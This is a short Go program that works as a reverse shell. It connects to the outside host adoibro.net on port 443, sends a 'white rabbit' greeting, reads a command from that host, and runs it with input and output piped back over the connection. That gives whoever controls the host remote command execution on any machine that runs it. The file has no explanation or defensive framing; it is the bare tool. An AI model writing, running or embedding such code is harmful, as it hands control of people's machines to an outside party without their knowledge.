package main

import (
	"bufio"
	"log"
	"net"
	"os/exec"
	"strings"
	"time"
)

const (
	t_secs = 5
)

func main() {

	time_out := time.Duration(t_secs) * time.Second
	conn, err := net.DialTimeout("tcp", "adoibro.net:443", time_out)

	if err != nil {
		log.Println(err)
		return
	}

	buffer := bufio.NewWriter(conn)
	buffer.WriteString("Following the white rabbit... \n\r")
	buffer.Flush()

	msg, _ := bufio.NewReader(conn).ReadString('\n')

	out := exec.Command(strings.TrimSuffix(msg, "\n"))
	out.Stdin = conn
	out.Stdout = conn
	out.Stderr = conn

	out.Run()
}
